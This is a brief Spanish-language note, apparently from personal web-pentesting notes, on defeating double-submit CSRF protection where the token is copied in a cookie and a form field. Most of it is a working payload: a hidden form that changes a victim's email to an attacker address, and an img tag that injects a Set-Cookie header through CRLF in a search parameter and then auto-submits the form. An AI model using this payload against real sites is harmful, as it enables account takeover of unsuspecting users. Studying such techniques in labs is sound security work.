# CSRF con token duplicado en cookie  

Tags: #CSRF #BurpSuite #XSRF   

```bash 
En este caso se presenta que el CSRF Token es el mismo tanto en la cookie como en el campo del cuerpo. Por lo que si se logra colocar los mismos en ambos casos se puede hacer el ataque 
```

```bash 
<form class="login-form" name="change-email-form" action="https://web.com/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="hacked@hacked.com">
	<input required="" type="hidden" name="csrf" value="123">
</form>

<img src="https://web.com/?search=hola%0d%0aSet-Cookie:%20csrf=123%3b%20SameSite=None" onerror="document.forms[0].submit();">
```